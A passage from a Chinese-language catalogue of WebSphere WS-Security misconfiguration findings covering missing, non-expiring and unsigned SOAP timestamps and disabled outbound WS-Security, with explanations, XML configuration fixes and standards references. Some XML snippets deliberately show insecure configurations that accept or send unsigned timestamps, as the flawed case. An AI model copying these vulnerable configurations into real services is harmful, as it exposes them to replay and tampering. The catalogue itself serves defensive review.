<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Outbound Timestamp"></a>WebSphere Service Requester Misconfiguration: Missing Outbound Timestamp</h4><h5 id="ABSTRACT-235"><a href="#ABSTRACT-235" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-236"><a href="#EXPLANATION-236" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<h5 id="RECOMMENDATIONS-235"><a href="#RECOMMENDATIONS-235" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果该服务提供程序提供支持，则将客户端配置为在输出的请求中包含时间戳。</p>
<p>下列 WebSphere 配置在输出的请求中包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212078169562&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-234"><a href="#REFERENCES-234" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Missing-Timestamp-Expiration"><a href="#WebSphere-Service-Requester-Misconfiguration-Missing-Timestamp-Expiration" class="headerlink" title="WebSphere Service Requester Misconfiguration: Missing Timestamp Expiration"></a>WebSphere Service Requester Misconfiguration: Missing Timestamp Expiration</h4><h5 id="ABSTRACT-236"><a href="#ABSTRACT-236" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若 SOAP 消息含有不会到期的时间戳，则它可能容易受到 replay 攻击。</p>
<h5 id="EXPLANATION-237"><a href="#EXPLANATION-237" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>时间戳到期时，随该时间戳一同发送的任何安全语义也会随之到期。因此，没有有效期的时间戳可能会让安全语义（例如 UsernameToken 凭证）永远保持有效。</p>
<h5 id="RECOMMENDATIONS-236"><a href="#RECOMMENDATIONS-236" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保时间戳具有到期时间。</p>
<p>例如，下面的 addTimestamp 元素包含 expires 属性：</p>
<p><code>&lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</code></p>
<h5 id="REFERENCES-235"><a href="#REFERENCES-235" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><a href="#WebSphere-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled" class="headerlink" title="WebSphere Service Requester Misconfiguration: Outbound WS-Security Not Enabled"></a>WebSphere Service Requester Misconfiguration: Outbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-237"><a href="#ABSTRACT-237" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若请求不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-238"><a href="#EXPLANATION-238" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的增强功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<p>若 IBM WebSphere WS-Security 客户端部署描述符扩展文件中缺少 <code>&lt;securityRequestGeneratorServiceConfig&gt;</code> 标签，则表明未启用输出消息的安全性。</p>
<h5 id="RECOMMENDATIONS-237"><a href="#RECOMMENDATIONS-237" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为使用 WS-Security。该配置应包含 <code>&lt;securityRequestGeneratorServiceConfig&gt;</code> 标签以及适当的安全令牌、时间戳、签名和加密标签。</p>
<h5 id="REFERENCES-236"><a href="#REFERENCES-236" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp"><a href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Inbound-Timestamp" class="headerlink" title="WebSphere Service Requester Misconfiguration: Unsigned Inbound Timestamp"></a>WebSphere Service Requester Misconfiguration: Unsigned Inbound Timestamp</h4><h5 id="ABSTRACT-238"><a href="#ABSTRACT-238" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-239"><a href="#EXPLANATION-239" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列客户端配置可让 WebSphere 接受未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-238"><a href="#RECOMMENDATIONS-238" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将此客户端配置为对输入的时间戳验证签名。</p>
<p>下列客户端配置可让 WebSphere 验证来自服务提供程序的消息签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseConsumerServiceConfig xmi:id=&quot;SecurityResponseConsumerServiceConfig_1212093287097&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredIntegrity xmi:id=&quot;Integrity_1212093287097&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/requiredIntegrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-237"><a href="#REFERENCES-237" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp"><a href="#WebSphere-Service-Requester-Misconfiguration-Unsigned-Outbound-Timestamp" class="headerlink" title="WebSphere Service Requester Misconfiguration: Unsigned Outbound Timestamp"></a>WebSphere Service Requester Misconfiguration: Unsigned Outbound Timestamp</h4><h5 id="ABSTRACT-239"><a href="#ABSTRACT-239" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-240"><a href="#EXPLANATION-240" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列客户端配置可让 WebSphere 发送未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-239"><a href="#RECOMMENDATIONS-239" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将此客户端配置为对输出的时间戳进行签名。</p>
<p>下列客户端配置可让 WebSphere 对输出的时间戳进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1212078169562&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredIntegrity xmi:id=&quot;Integrity_1212093287097&quot; name=&quot;int1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;addTimestamp xmi:id=&quot;AddTimestamp_1212093882250&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/requiredIntegrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-238"><a href="#REFERENCES-238" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
